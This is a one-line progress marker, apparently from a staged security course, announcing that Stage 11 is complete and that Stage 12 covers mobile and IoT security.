*Stage 11 Complete - Continue to Stage 12: Mobile and IoT Security*
